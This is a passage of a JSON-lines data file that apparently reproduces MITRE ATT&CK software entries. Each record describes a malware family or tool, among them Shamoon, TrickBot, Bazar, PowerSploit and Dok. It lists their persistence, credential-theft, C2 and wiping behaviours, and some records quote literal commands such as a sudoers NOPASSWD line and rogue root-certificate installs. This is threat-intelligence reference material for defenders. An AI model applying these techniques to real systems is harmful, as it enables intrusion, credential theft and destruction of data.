hardcoded IP addresses of Siemens SIPROTEC devices.", "Industroyer’s data wiper component enumerates specific files on all the Windows drives.", "Industroyer can use an arbitrary system service to load at system boot for persistence and replaces the ImagePath registry value of a Windows service with a new backdoor binary. ", "Industroyer’s 61850 payload component enumerates connected network adapters and their corresponding IP addresses.", "Industroyer attempts to perform an HTTP CONNECT via an internal proxy to establish a tunnel.", "Industroyer’s data wiper module clears registry keys and overwrites both ICS configuration and Windows files.", "Industroyer can use supplied user credentials to execute processes and stop services.", "Industroyer collects the victim machine’s Windows GUID.", "Industroyer’s data wiper module writes zeros into the registry keys in <code>SYSTEM\\CurrentControlSet\\Services</code> to render a system inoperable."], "is_subtechnique": false}
{"text": " [Wiper](https://attack.mitre.org/software/S0041) is a family of destructive malware used in March 2013 during breaches of South Korean banks and media companies. (Citation: Dell Wiper)", "idx": "https://attack.mitre.org/software/S0041", "title": "Wiper", "entity": "Wiper", "entity_type": "software", "entity_context": ["It is believed that a patch management system for an anti-virus product commonly installed among targeted companies was used to distribute the Wiper malware."], "is_subtechnique": false}
{"text": " [Shamoon](https://attack.mitre.org/software/S0140) is wiper malware that was first used by an Iranian group known as the \"Cutting Sword of Justice\" in 2012. Other versions known as Shamoon 2 and Shamoon 3 were observed in 2016 and 2018. [Shamoon](https://attack.mitre.org/software/S0140) has also been seen leveraging [RawDisk](https://attack.mitre.org/software/S0364) and Filerase to carry out data wiping tasks. The term Shamoon is sometimes used to refer to the group using the malware as well as the malware itself.(Citation: Palo Alto Shamoon Nov 2016)(Citation: Unit 42 Shamoon3 2018)(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)", "idx": "https://attack.mitre.org/software/S0140", "title": "Shamoon", "entity": "Shamoon", "entity_type": "software", "entity_context": ["Shamoon copies an executable payload to the target system by using SMB/Windows Admin Shares and then scheduling an unnamed task to execute the malware.", "Shamoon creates a new service named “ntssrv” that attempts to appear legitimate; the service's display name is “Microsoft Network Realtime Inspection Service” and its description is “Helps guard against time change attempts targeting known and newly discovered vulnerabilities in network time protocols.” Newer versions create the \"MaintenaceSrv\" service, which misspells the word \"maintenance.\"", "Shamoon decrypts ciphertext using an XOR cipher and a base64-encoded string.\t", "Shamoon has been seen overwriting features of disk structure such as the MBR.", "Shamoon obtains the target's IP address and local network segment.", "Shamoon attempts to disable UAC remote restrictions by modifying the Registry.", "Shamoon has an operational mode for encrypting data instead of overwriting it.", "Once Shamoon has access to a network share, it enables the RemoteRegistry service on the target system. It will then connect to the system with RegConnectRegistryW and modify the Registry to disable UAC remote restrictions by setting <code>SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\LocalAccountTokenFilterPolicy</code> to 1.", "Shamoon creates a new service named “ntssrv” to execute the payload. Newer versions create the \"MaintenaceSrv\" and \"hdv_725x\" services.", "Shamoon scans the C-class subnet of the IPs on the victim's interfaces.", "Shamoon can change the modified time for files to evade forensic detection.\t", "Shamoon accesses network share(s), enables share access to the target device, copies an executable payload to the target system, and uses a Scheduled Task/Job to execute the malware.", "If Shamoon cannot access shares using current privileges, it attempts access using hard coded, domain-specific credentials gathered earlier in the intrusion.", "Shamoon obtains the system time and will only activate if it is greater than a preset date.", "Shamoon contains base64-encoded strings.", "Shamoon can impersonate tokens using <code>LogonUser</code>, <code>ImpersonateLoggedOnUser</code>, and <code>ImpersonateNamedPipeClient</code>.", "Shamoon can download an executable to run on the victim.", "Shamoon obtains the victim's operating system version and keyboard layout and sends the information to the C2 server.", "Shamoon has used HTTP for C2.", "Shamoon attempts to copy itself to remote machines on the network.", "Shamoon creates a new service named “ntssrv” to execute the payload. Shamoon can also spread via PsExec.", "Shamoon will reboot the infected system once the wiping functionality has been completed.\t", "Shamoon attempts to overwrite operating system files and disk structures with image files. In a later variant, randomly generated data was used for data overwrites.", "Shamoon queries several Registry keys to identify hard disk partitions to overwrite."], "is_subtechnique": false}
{"text": " [Pass-The-Hash Toolkit](https://attack.mitre.org/software/S0122) is a toolkit that allows an adversary to \"pass\" a password hash (without knowing the original password) to log in to systems. (Citation: Mandiant APT1)", "idx": "https://attack.mitre.org/software/S0122", "title": "Pass-The-Hash Toolkit", "entity": "Pass-The-Hash Toolkit", "entity_type": "software", "entity_context": ["Pass-The-Hash Toolkit can perform pass the hash."], "is_subtechnique": false}
{"text": " [TDTESS](https://attack.mitre.org/software/S0164) is a 64-bit .NET binary backdoor used by [CopyKittens](https://attack.mitre.org/groups/G0052). (Citation: ClearSky Wilted Tulip July 2017)", "idx": "https://attack.mitre.org/software/S0164", "title": "TDTESS", "entity": "TDTESS", "entity_type": "software", "entity_context": ["TDTESS has a command to download and execute an additional file.", "If running as administrator, TDTESS installs itself as a new service named bmwappushservice to establish persistence.", "After creating a new service for persistence, TDTESS sets the file creation time for the service to the creation time of the victim's legitimate svchost.exe file.", "TDTESS provides a reverse shell on the victim.", "TDTESS creates then deletes log files during installation of itself as a service."], "is_subtechnique": false}
{"text": " [Bazar](https://attack.mitre.org/software/S0534) is a downloader and backdoor that has been used since at least April 2020, with infections primarily against professional services, healthcare, manufacturing, IT, logistics and travel companies across the US and Europe. [Bazar](https://attack.mitre.org/software/S0534) reportedly has ties to [TrickBot](https://attack.mitre.org/software/S0266) campaigns and can be used to deploy additional malware, including ransomware, and to steal sensitive data.(Citation: Cybereason Bazar July 2020)", "idx": "https://attack.mitre.org/software/S0534", "title": "Bazar", "entity": "Bazar", "entity_type": "software", "entity_context": ["Bazar can collect the time on the compromised host.", "Bazar can identify the installed antivirus engine.", "Bazar can inject into a target process using process doppelgänging.", "Bazar can use various APIs to allocate memory and facilitate code execution/injection.", "Bazar can identify the username of the infected user.", "Bazar can create a scheduled task for persistence.", "Bazar can inject code through calling <code>VirtualAllocExNuma</code>.", "Bazar can enumerate remote systems using <code> Net View</code>.", "The Bazar loader is used to download and execute the Bazar backdoor.", "Bazar can execute a PowerShell script received from C2.", "Bazar can query <code>Windows\\CurrentVersion\\Uninstall</code> for installed applications.", "Bazar can identify administrator accounts on an infected host.", "Bazar can send C2 communications with XOR encryption.", "Bazar can identity the current process on a compromised host.", "Bazar can download and deploy additional payloads, including ransomware and post-exploitation frameworks such as Cobalt Strike.", "Bazar can use a timer to delay execution of core functionality.", "Bazar can use Winlogon Helper DLL to establish persistence.", "Bazar has been signed with fake certificates including those appearing to be from VB CORPORATE PTY. LTD.", "Bazar can enumerate shared drives on the domain.", "Bazar can implement DGA using the current date as a seed variable.", "Bazar can launch cmd.exe to perform reconnaissance commands.", "The Bazar loader has named malicious shortcuts \"adobe\" and mimicked communications software.", "Bazar can create a task named to appear benign.", "Bazar can use TLS in C2 communications.", "Bazar has been spread via emails with embedded malicious links.", "The Bazar loader has used dual-extension executable files such as PreviewReport.DOC.exe.", "Bazar's loader can delete scheduled tasks created by a previous instance of the malware.\t", "Bazar can establish persistence by writing shortcuts to the Windows Startup folder.", "Bazar has used XOR, RSA2, and RC4 encrypted files.", "Bazar has a variant with a packed payload.", "Bazar has manually loaded ntdll from disk in order to identity and remove API hooks set by security products.\t", "Bazar can perform a check to ensure that the operating system's keyboard and language settings are not set to Russian.", "Bazar can delete its loader using a batch file in the Windows temporary folder.", "Bazar has the ability to identify domain administrator accounts.", "Bazar can retrieve information from the infected machine.", "Bazar can attempt to overload sandbox analysis by sending 1550 calls to <code>printf</code>.", "Bazar can enumerate the victim's desktop.", "Bazar has the ability to use an alternative C2 server if the primary server fails.", "Bazar can use HTTP and HTTPS over ports 80 and 443 in C2 communications.", "Bazar can collect the IP address and NetBIOS name of an infected machine.", "Bazar has been downloaded via Windows BITS functionality.", "Bazar downloads have been hosted on Google Docs.", "Bazar can decrypt downloaded payloads. Bazar also resolves strings and API calls at runtime.", "Bazar can create or add files to Registry Run Keys to establish persistence.", "Bazar can gain execution after a user clicks on a malicious link to decoy landing pages hosted on Google Docs.", "Bazar can fingerprint architecture, computer name, and OS version on the compromised host. Bazar can also check if the Russian language is installed on the infected machine and terminate if it is found.", "Bazar can query the Registry for installed applications.", "Bazar can execute a WMI query to gather information about the installed antivirus engine.", "Bazar can use Nltest tools to obtain information about the domain.", "Bazar can inject into a target process including Svchost, Explorer, and cmd using process hollowing."], "is_subtechnique": false}
{"text": " [Okrum](https://attack.mitre.org/software/S0439) is a Windows backdoor that has been seen in use since December 2016 with strong links to [Ke3chang](https://attack.mitre.org/groups/G0004).(Citation: ESET Okrum July 2019)", "idx": "https://attack.mitre.org/software/S0439", "title": "Okrum", "entity": "Okrum", "entity_type": "software", "entity_context": ["Okrum's installer can attempt to achieve persistence by creating a scheduled task.", "Okrum loader only executes the payload after the left mouse button has been pressed at least three times, in order to avoid being executed within virtualized or emulated environments. ", "Okrum's loader can create a new service named NtmsSvc to execute the payload.", "Okrum has used a custom implementation of AES encryption to encrypt collected data.", "Okrum has built-in commands for uploading, downloading, and executing files to the system.", "Okrum can collect computer name, locale information, and information about the OS and architecture.", "Data exfiltration is done by Okrum using the already opened channel with the C2 server.", "Okrum was seen using NetSess to discover NetBIOS sessions.", "Okrum's backdoor deletes files after they have been successfully uploaded to C2 servers.", "Okrum's loader can decrypt the backdoor code, embedded within the loader or within a legitimate PNG file. A custom XOR cipher or RC4 is used for decryption.", "Okrum can collect the victim username.", "To establish persistence, Okrum can install itself as a new service named NtmSsvc.", "Okrum uses AES to encrypt network traffic. The key can be hardcoded or negotiated with the C2 server in the registration phase. ", "Before exfiltration, Okrum's backdoor has used hidden files to store logs and outputs from backdoor commands.", "Okrum can establish persistence by adding a new service NtmsSvc with the display name Removable Storage to masquerade as a legitimate Removable Storage Manager.", "Okrum can impersonate a logged-on user's security context using a call to the ImpersonateLoggedOnUser API.", "Okrum was seen using a keylogger tool to capture keystrokes. ", "Okrum was seen using MimikatzLite to perform credential dumping.", "Okrum mimics HTTP protocol for C2 communication, while hiding the actual messages in the Cookie and Set-Cookie headers of the HTTP requests.", "Okrum establishes persistence by creating a .lnk shortcut to itself in the Startup folder. ", "Okrum can identify proxy servers configured and used by the victim, and use it to make HTTP requests to C2 its server.", "Okrum has used base64 to encode C2 communication.", "Okrum's loader can detect presence of an emulator by using two calls to GetTickCount API, and checking whether the time has been accelerated.", "Okrum's backdoor has used cmd.exe to execute arbitrary commands as well as batch scripts to update itself to a newer version.", "Okrum has used DriveLetterView to enumerate drive information.", "Okrum's loader can check the amount of physical memory and terminates itself if the host has less than 1.5 Gigabytes of physical memory in total.", "Okrum can obtain the date and time of the compromised system.", "Okrum can establish persistence by creating a .lnk shortcut to itself in the Startup folder.", "Okrum can collect network information, including the host IP address, DNS, and proxy information.", "Okrum's payload is encrypted and embedded within its loader, or within a legitimate PNG file.", "Okrum was seen using modified Quarks PwDump to perform credential dumping.", "Okrum uses HTTP for communication with its C2.", "Okrum was seen using a RAR archiver tool to compress/decompress data."], "is_subtechnique": false}
{"text": " [Astaroth](https://attack.mitre.org/software/S0373) is a Trojan and information stealer known to affect companies in Europe, Brazil, and throughout Latin America. It has been known publicly since at least late 2017. (Citation: Cybereason Astaroth Feb 2019)(Citation: Cofense Astaroth Sept 2018)(Citation: Securelist Brazilian Banking Malware July 2020)", "idx": "https://attack.mitre.org/software/S0373", "title": "Astaroth", "entity": "Astaroth", "entity_type": "software", "entity_context": ["Astaroth can abuse alternate data streams (ADS) to store content for malicious payloads.", "Astaroth checks for the presence of Avast antivirus in the <code>C:\\Program\\Files\\</code> folder. ", "Astaroth can create a new process in a suspended state from a targeted legitimate process in order to unmap its memory and replace it with malicious code.", "Astaroth has been delivered via malicious e-mail attachments.", "Astaroth can check for Windows product ID's used by sandboxes and usernames and disk serial numbers associated with analyst environments.", "Astaroth obfuscates its JScript code, and has used an XOR-based algorithm to encrypt payloads twice with different keys.", "Astaroth exfiltrates collected information from its r1.log file to the external C2 server. ", "Astaroth collects the timestamp from the infected machine. ", "Astaroth can store C2 information on cloud hosting services such as AWS and CloudFlare and websites like YouTube and Facebook.", "Astaroth uses JavaScript to perform its core functionalities. ", "Astaroth loads its module with the XSL script parameter <code>vShow</code> set to zero, which opens the application with a hidden window. ", "Astaroth collects data in a plaintext file named r1.log before exfiltration. ", "Astaroth uses an external software known as NetPass to recover passwords. ", "Astaroth has used malicious VBS e-mail attachments for execution.", "Astaroth uses WMIC to execute payloads. ", "Astaroth uses a fromCharCode() deobfuscation method to avoid explicitly writing execution commands and to hide its code. ", "Astaroth encodes data using Base64 before sending it to the C2 server. ", "Astaroth spawns a CMD process to execute commands. ", "Astaroth searches for different processes on the system.", "Astaroth uses ActiveX objects for file execution and manipulation. ", "Astaroth logs keystrokes from the victim's machine. ", "Astaroth collects the external IP address from the system. ", "Astaroth executes embedded JScript or VBScript in an XSL stylesheet located on a remote domain. ", "Astaroth's initial payload is a malicious .LNK file. ", "Astaroth creates a startup item for persistence. ", "Astaroth collects the machine name and keyboard language from the system. ", "Astaroth collects information from the clipboard by using the OpenClipboard() and GetClipboardData() libraries. ", "Astaroth can launch itself via DLL Search Order Hijacking.", "Astaroth uses the LoadLibraryExW() function to load additional modules. ", "Astaroth can be loaded through regsvr32.exe.", "Astaroth has used malicious files including VBS, LNK, and HTML for execution.", "Astaroth has used a DGA in C2 communications.", "Astaroth uses a software packer called Pe123\\RPolyCryptor.", "Astaroth uses certutil and BITSAdmin to download additional malware. "], "is_subtechnique": false}
{"text": " [TrickBot](https://attack.mitre.org/software/S0266) is a Trojan spyware program written in C++ that first emerged in September 2016 as a possible successor to [Dyre](https://attack.mitre.org/software/S0024). [TrickBot](https://attack.mitre.org/software/S0266) was developed and initially used by [Wizard Spider](https://attack.mitre.org/groups/G0102) for targeting banking sites in North America, Australia, and throughout Europe; it has since been used against all sectors worldwide as part of \"big game hunting\" ransomware campaigns.(Citation: S2 Grupo TrickBot June 2017)(Citation: Fidelis TrickBot Oct 2016)(Citation: IBM TrickBot Nov 2016)(Citation: CrowdStrike Wizard Spider October 2020)", "idx": "https://attack.mitre.org/software/S0266", "title": "TrickBot", "entity": "TrickBot", "entity_type": "software", "entity_context": ["TrickBot utilizes EternalBlue and EternalRomance exploits for lateral movement in the modules wormwinDll, wormDll, mwormDll, nwormDll, tabDll.", "TrickBot uses port 443 for C2 communications.", "TrickBot searches the system for all of the following file extensions: .avi, .mov, .mkv, .mpeg, .mpeg4, .mp4, .mp3, .wav, .ogg, .jpeg, .jpg, .png, .bmp, .gif, .tiff, .ico, .xlsx, and .zip. It can also obtain browsing history, cookies, and plug-in information.", "TrickBot has used a VNC module to monitor the victim and collect information to pivot to valuable systems on the network ", "TrickBot uses web injects and browser redirection to trick the user into providing their login credentials on a fake or modified web page.", "TrickBot has retrieved PuTTY credentials by querying the <code>Software\\SimonTatham\\Putty\\Sessions</code> registry key ", "TrickBot can obtain passwords stored in files from web browsers such as Chrome, Firefox, Internet Explorer, and Microsoft Edge, sometimes using esentutl.", "TrickBot can gather information about domain trusts by utilizing Nltest.", "TrickBot establishes persistence in the Startup folder.", "TrickBot uses module networkDll for process list discovery.", "TrickBot has used <code>printf</code> and file I/O loops to delay process execution as part of API hammering.", "TrickBot collects email addresses from Outlook.", "TrickBot uses a custom crypter leveraging Microsoft’s CryptoAPI to encrypt C2 traffic.Newer versions of TrickBot have been known to use `bcrypt` to encrypt and digitally sign responses to their C2 server. ", "TrickBot can identify the groups the user on a compromised host belongs to.", "TrickBot can modify registry entries.", "Some TrickBot samples have used HTTP over ports 447 and 8082 for C2. Newer versions of TrickBot have been known to use a custom communication protocol which sends the data unencrypted over port 443. ", "The TrickBot downloader has used an icon to appear as a Microsoft Word document.", "TrickBot obtains the IP address, location, and other relevant network information from the victim’s machine.", "TrickBot collects the users of the system.", "TrickBot can enumerate computers and network devices.", "TrickBot has the ability to capture RDP credentials by capturing the <code>CredEnumerateA</code> API ", "TrickBot can send information about the compromised host and upload data to a hardcoded C2 server.", "TrickBot can steal passwords from the KeePass open source password manager.", "TrickBot has been known to reach a command and control server via one of nine proxy IP addresses.  ", "TrickBot uses vncDll module to remote control the victim machine.", "TrickBot used COM to setup scheduled task for persistence.", "TrickBot collects a list of install programs and services on the system’s machine.", "TrickBot injects into the svchost.exe process.", "TrickBot can identify the user and groups the user belongs to on a compromised host.", "TrickBot can Base64-encode C2 commands.", "TrickBot decodes the configuration data and modules.", "TrickBot downloads several additional files and saves them to the victim's machine.", "TrickBot can use secondary C2 servers for communication after establishing connectivity and relaying victim information to primary C2 servers.", "TrickBot uses brute-force attack against RDP with rdpscanDll module.", "TrickBot module shareDll/mshareDll discovers network shares via the WNetOpenEnumA API.", "TrickBot uses HTTPS to communicate with its C2 servers, to get malware updates, modules that perform most of the malware logic and various configuration files.", "TrickBot has used an email with an Excel sheet containing a malicious macro to deploy the malware", "TrickBot can disable Windows Defender.", "TrickBot establishes persistence by creating an autostart service that allows it to run whenever the machine boots.", "TrickBot has been delivered via malicious links in phishing e-mails.", "TrickBot uses the Windows API call, CreateProcessW(), to manage execution flow. TrickBot has also used <code>Nt*</code> API functions to perform Process Injection.", "TrickBot leverages a custom packer to obfuscate its functionality.", "TrickBot has used <code>Nt*</code> Native API functions to inject code into legitimate processes such as <code>wermgr.exe</code>.", "TrickBot has used macros in Excel documents to download and deploy the malware on the user’s machine.", "TrickBot has been known to use PowerShell to download new payloads, open documents, and upload data to command and control servers. \n ", "TrickBot gathers the OS version, machine name, CPU type, amount of RAM available, and UEFI/BIOS firmware information from the victim’s machine.", "TrickBot collects local files and information from the victim’s local machine.", "TrickBot creates a scheduled task on the system that provides persistence.", "TrickBot can implant malicious code into a compromised device's firmware.", "TrickBot has attempted to get users to launch malicious documents to deliver its payload. ", "TrickBot can obtain passwords stored in files from several applications such as Outlook, Filezilla, OpenSSH, OpenVPN and WinSCP. Additionally, it searches for the \".vnc.lnk\" affix to steal VNC credentials.", "TrickBot module \"Trickboot\" can write or erase the UEFI/BIOS firmware of a compromised device.", "TrickBot uses non-descriptive names to hide functionality and uses an AES CBC (256 bits) encryption algorithm for its loader and configuration files.", "TrickBot has come with a signed downloader component."], "is_subtechnique": false}
{"text": " [SoreFang](https://attack.mitre.org/software/S0516) is first stage downloader used by [APT29](https://attack.mitre.org/groups/G0016) for exfiltration and to load other malware.(Citation: NCSC APT29 July 2020)(Citation: CISA SoreFang July 2016)", "idx": "https://attack.mitre.org/software/S0516", "title": "SoreFang", "entity": "SoreFang", "entity_type": "software", "entity_context": ["SoreFang can enumerate domain accounts via <code>net.exe user /domain</code>.", "SoreFang can download additional payloads from C2.", "SoreFang can collect the hostname, operating system configuration, product ID, and disk space on victim machines by executing Systeminfo.", "SoreFang can collect the TCP/IP, DNS, DHCP, and network adapter configuration on a compromised host via <code>ipconfig.exe /all</code>.", "SoreFang can collect usernames from the local system via <code>net.exe user</code>.", "SoreFang can decode and decrypt exfiltrated data sent to C2.", "SoreFang can use HTTP in C2 communications.", "SoreFang has the ability to encode and RC6 encrypt data sent to C2.", "SoreFang can enumerate domain groups by executing <code>net.exe group /domain</code>.", "SoreFang can gain access by exploiting a Sangfor SSL VPN vulnerability that allows for the placement and delivery of malicious update binaries.", "SoreFang can gain persistence through use of scheduled tasks.", "SoreFang can enumerate processes on a victim machine through use of Tasklist.", "SoreFang has the ability to list directories."], "is_subtechnique": false}
{"text": " [BADCALL](https://attack.mitre.org/software/S0245) is a Trojan malware variant used by the group [Lazarus Group](https://attack.mitre.org/groups/G0032). (Citation: US-CERT BADCALL)", "idx": "https://attack.mitre.org/software/S0245", "title": "BADCALL", "entity": "BADCALL", "entity_type": "software", "entity_context": ["BADCALL collects the computer name and host name on the compromised system.", "BADCALL disables the Windows firewall before binding to a port.", "BADCALL encrypts C2 traffic using an XOR/ADD cipher.", "BADCALL collects the network adapter information.", "BADCALL uses a FakeTLS method during C2.", "BADCALL functions as a proxy server between the victim and C2 server.", "BADCALL uses port 8000 and 443 for C2.", "BADCALL modifies the firewall Registry key <code>SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfileGloballyOpenPorts\\\\List</code>.", "BADCALL communicates on ports 443 and 8000 with a FakeTLS method."], "is_subtechnique": false}
{"text": " [ChChes](https://attack.mitre.org/software/S0144) is a Trojan that appears to be used exclusively by [menuPass](https://attack.mitre.org/groups/G0045). It was used to target Japanese organizations in 2016. Its lack of persistence methods suggests it may be intended as a first-stage tool. (Citation: Palo Alto menuPass Feb 2017) (Citation: JPCERT ChChes Feb 2017) (Citation: PWC Cloud Hopper Technical Annex April 2017)", "idx": "https://attack.mitre.org/software/S0144", "title": "ChChes", "entity": "ChChes", "entity_type": "software", "entity_context": ["ChChes collects the victim's %TEMP% directory path and version of Internet Explorer.", "ChChes establishes persistence by adding a Registry Run key.", "ChChes can encode C2 data with a custom technique that utilizes Base64.\t", "ChChes communicates to its C2 server over HTTP and embeds data within the Cookie HTTP header.", "ChChes can alter the victim's proxy configuration.", "ChChes can encrypt C2 traffic with AES or RC4.", "ChChes samples were digitally signed with a certificate originally used by Hacking Team that was later leaked and subsequently revoked.", "ChChes is capable of downloading files, including additional modules.", "ChChes collects its process identifier (PID) on the victim.", "ChChes collects the victim hostname, window resolution, and Microsoft Windows version.", "ChChes steals credentials stored inside Internet Explorer.", "ChChes copies itself to an .exe file with a filename that is likely intended to imitate Norton Antivirus but has several letters reversed (e.g. notron.exe)."], "is_subtechnique": false}
{"text": " [CrossRAT](https://attack.mitre.org/software/S0235) is a cross platform RAT.", "idx": "https://attack.mitre.org/software/S0235", "title": "CrossRAT", "entity": "CrossRAT", "entity_type": "software", "entity_context": ["CrossRAT can list all files on a system.", "CrossRAT uses run keys for persistence on Windows", "CrossRAT creates a Launch Agent on macOS.", "CrossRAT is capable of taking screen captures."], "is_subtechnique": false}
{"text": " [P8RAT](https://attack.mitre.org/software/S0626) is a fileless malware used by [menuPass](https://attack.mitre.org/groups/G0045) to download and execute payloads since at least 2020.(Citation: Securelist APT10 March 2021)", "idx": "https://attack.mitre.org/software/S0626", "title": "P8RAT", "entity": "P8RAT", "entity_type": "software", "entity_context": ["P8RAT can check the compromised host for processes associated with VMware or VirtualBox environments.", "P8RAT can download additional payloads to a target system.", "P8RAT can check for specific processes associated with virtual environments.", "P8RAT can send randomly-generated data as part of its C2 communication.", "P8RAT has the ability to \"sleep\" for a specified time to evade detection."], "is_subtechnique": false}
{"text": " [SDelete](https://attack.mitre.org/software/S0195) is an application that securely deletes data in a way that makes it unrecoverable. It is part of the Microsoft Sysinternals suite of tools. (Citation: Microsoft SDelete July 2016)", "idx": "https://attack.mitre.org/software/S0195", "title": "SDelete", "entity": "SDelete", "entity_type": "software", "entity_context": ["SDelete deletes data in a way that makes it unrecoverable."], "is_subtechnique": false}
{"text": " [Dok](https://attack.mitre.org/software/S0281) is a Trojan application disguised as a .zip file that is able to collect user credentials and install a malicious proxy server to redirect a user's network traffic (i.e. [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)).(Citation: objsee mac malware 2017)(Citation: hexed osx.dok analysis 2019)(Citation: CheckPoint Dok)", "idx": "https://attack.mitre.org/software/S0281", "title": "Dok", "entity": "Dok", "entity_type": "software", "entity_context": ["Dok uses AppleScript to create a login item for persistence.", "Dok gives all users execute permissions for the application using the command <code>chmot +x /Users/Shared/AppStore.app</code>.", "Dok installs two LaunchAgents to redirect all network traffic with a randomly generated name for each plist file maintaining the format <code>com.random.name.plist</code>.", "Dok exfiltrates logs of its execution stored in the <code>/tmp</code> folder over FTP using the <code>curl</code> command. ", "Dok prompts the user for credentials.", "Dok is packed with an UPX executable packer.", "Dok installs a root certificate to aid in Adversary-in-the-Middle actions using the command <code>add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /tmp/filename</code>.", "Dok adds <code>admin  ALL=(ALL) NOPASSWD: ALL</code> to the <code>/etc/sudoers</code> file.", "Dok downloads and installs Tor via homebrew.", "Dok proxies web traffic to potentially monitor and alter victim HTTP(S) traffic.", "Dok uses AppleScript to install a login Item by sending Apple events to the <code>System Events</code> process."], "is_subtechnique": false}
{"text": " [PowerSploit](https://attack.mitre.org/software/S0194) is an open source, offensive security framework comprised of [PowerShell](https://attack.mitre.org/techniques/T1059/001) modules and scripts that perform a wide range of tasks related to penetration testing such as code execution, persistence, bypassing anti-virus, recon, and exfiltration. (Citation: GitHub PowerSploit May 2012) (Citation: PowerShellMagazine PowerSploit July 2014) (Citation: PowerSploit Documentation)", "idx": "https://attack.mitre.org/software/S0194", "title": "PowerSploit", "entity": "PowerSploit", "entity_type": "software", "entity_context": ["PowerSploit contains a collection of Exfiltration modules that can harvest credentials from Group Policy Preferences.", "PowerSploit's <code>Get-Keystrokes</code> Exfiltration module can log keystrokes.", "PowerSploit contains a collection of Privesc-PowerUp modules that can discover and exploit various path interception opportunities in services, processes, and variables.", "PowerSploit contains a collection of Exfiltration modules that can harvest credentials using Mimikatz.", "PowerSploit's <code>Get-TimedScreenshot</code> Exfiltration module can take screenshots at regular intervals.", "PowerSploit's <code>Get-ProcessTokenPrivilege</code> Privesc-PowerUp module can enumerate privileges for a given process.", "PowerSploit contains a collection of ScriptModification modules that compress and encode scripts and payloads.", "PowerSploit contains a collection of Exfiltration modules that can access data from local files, volumes, and processes.", "PowerSploit contains a collection of Privesc-PowerUp modules that can discover and exploit search order hijacking vulnerabilities.", "PowerSploit has modules such as <code>Get-NetDomainTrust</code> and <code>Get-NetForestTrust</code> to enumerate domain and forest trusts.", "PowerSploit's <code>Get-ProcessTokenGroup</code> Privesc-PowerUp module can enumerate all SIDs associated with its current token.", "PowerSploit's <code>Invoke-Kerberoast</code> module can request service tickets and return crackable ticket hashes.", "PowerSploit has several modules that search the Windows Registry for stored credentials: <code>Get-UnattendedInstallFile</code>, <code>Get-Webconfig</code>, <code>Get-ApplicationHost</code>, <code>Get-SiteListPassword</code>, <code>Get-CachedGPPPassword</code>, and <code>Get-RegistryAutoLogon</code>.", "PowerSploit contains a collection of Privesc-PowerUp modules that can discover and exploit path interception opportunities in the PATH environment variable.", "PowerSploit contains a collection of Privesc-PowerUp modules that can discover and exploit unquoted path vulnerabilities.", "PowerSploit contains a collection of Exfiltration modules that can harvest credentials from Windows vault credential objects.", "PowerSploit's <code>Get-MicrophoneAudio</code> Exfiltration module can record system microphone audio.", "PowerSploit reflectively loads a Windows PE file into a process.", "PowerSploit contains a collection of Privesc-PowerUp modules that can discover and replace/modify service binaries, paths, and configs.", "PowerSploit contains a collection of Privesc-PowerUp modules that can query Registry keys for potential opportunities.", "PowerSploit's <code>New-UserPersistenceOption</code> Persistence argument can be used to establish via a Scheduled Task/Job.", "PowerSploit's <code>Install-SSP</code> Persistence module can be used to establish by installing a SSP DLL.", "PowerSploit's <code>Find-AVSignature</code> AntivirusBypass module can be used to locate single byte anti-virus signatures.", "PowerSploit contains a collection of CodeExecution modules that inject code (DLL, shellcode) into a process.", "PowerSploit's <code>New-UserPersistenceOption</code> Persistence argument can be used to establish via the <code>HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run</code> Registry key.", "PowerSploit modules are written in and executed via PowerShell.", "PowerSploit contains a collection of Privesc-PowerUp modules that can discover and exploit DLL hijacking opportunities in services and processes.", "PowerSploit's <code>Invoke-TokenManipulation</code> Exfiltration module can be used to manipulate tokens.", "PowerSploit's <code>Invoke-WmiCommand</code> CodeExecution module uses WMI to execute and retrieve the output from a PowerShell payload."], "is_subtechnique": false}
{"text": " [Hikit](https://attack.mitre.org/software/S0009) is malware that has been used by [Axiom](https://attack.mitre.org/groups/G0001) for late-stage persistence and exfiltration after the initial compromise.(Citation: Novetta-Axiom)(Citation: FireEye Hikit Rootkit)", "idx": "https://attack.mitre.org/software/S0009", "title": "Hikit", "entity": "Hikit", "entity_type": "software", "entity_context": ["Hikit supports peer connections.", "Hikit has attempted to disable driver signing verification by tampering with several Registry keys prior to the loading of a rootkit driver component.", "Hikit uses <code>certmgr.exe -add GlobalSign.cer -c -s -r localMachine Root</code> and <code>certmgr.exe -add GlobalSign.cer -c -s -r localMachineTrustedPublisher</code> to install a self-generated certificate to the local trust store as a root CA and Trusted Publisher.", "Hikit has used HTTP for C2.", "Hikit has used DLL Search Order Hijacking to load <code>oci.dll</code> as a persistence mechanism.", "Hikit performs XOR encryption.", "Hikit has the ability to create a remote shell and run given commands.", "Hikit is a Rootkit that has been used by Axiom.  "], "is_subtechnique": false}
{"text": " [WindTail](https://attack.mitre.org/software/S0466) is a macOS surveillance implant used by [Windshift](https://attack.mitre.org/groups/G0112). [WindTail](https://attack.mitre.org/software/S0466) shares code similarities with Hack Back aka KitM OSX.(Citation: SANS Windshift August 2018)(Citation: objective-see windtail1 dec 2018)(Citation: objective-see windtail2 jan 2019)", "idx": "https://attack.mitre.org/software/S0466", "title": "WindTail", "entity": "WindTail", "entity_type": "software", "entity_context": ["WindTail can use the <code>open</code> command to execute an application.", "WindTail can be delivered as a compressed, encrypted, and encoded payload.", "WindTail has the ability to use HTTP for C2 communications.", "WindTail can instruct the OS to execute an application without a dock icon or menu.", "WindTail can identify and add files that possess specific file extensions to an array for archiving.", "WindTail has used icons mimicking MS Office files to mask payloads.", "WindTail has the ability to enumerate the users home directory and the path to its own application bundle.", "WindTail has the ability to receive and execute a self-delete command.", "WindTail has the ability to use the macOS built-in zip utility to archive files.", "WindTail can invoke Apple APIs <code>contentsOfDirectoryAtPath</code>, <code>pathExtension</code>, and (string) <code>compare</code>.", "WindTail has the ability to generate the current date and time.", "WindTail has the ability to automatically exfiltrate files using the macOS built-in utility /usr/bin/curl.", "WindTail has been incompletely signed with revoked certificates.", "WindTail has the ability to decrypt strings using hard-coded AES keys."], "is_subtechnique": false}
